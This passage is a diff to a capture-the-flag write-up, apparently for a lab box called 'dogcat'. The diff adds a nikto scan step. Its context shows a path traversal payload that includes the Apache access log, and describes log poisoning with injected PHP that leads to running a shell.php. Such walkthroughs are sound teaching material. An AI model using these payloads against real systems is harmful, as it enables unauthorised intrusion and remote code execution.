@@ -75,9 +75,17 @@ You don't have permission to access this resource.
 Apache/2.4.38 (Debian)
 ```
 
+#### nikto
+
+In this case running nikto doesn't reveal anything new:
+
+```sh
+nikto -h 10.10.46.238
+```
+
 ### Visit website
 
-Once we visit the page on port 80 and click on dog or cat
+Let's visit the page on port 80 and click on dog or cat
 
 - We can see a random dog or cat pic
 - See url changes to ?view=dog or ?view=cat.
@@ -242,6 +250,7 @@ Use the previous technique to include the access log again:
 ```html
 ?view=./cat/../../../../../../../../var/log/apache2/access&ext=.log
 ```
+
 You should not see our injected agent string because the injected php code is interpreted and executed and has no output. But you can see if this worked by checking the status of the python HTTP server.
 
 We can now start the shell.php located in the the main web folder:
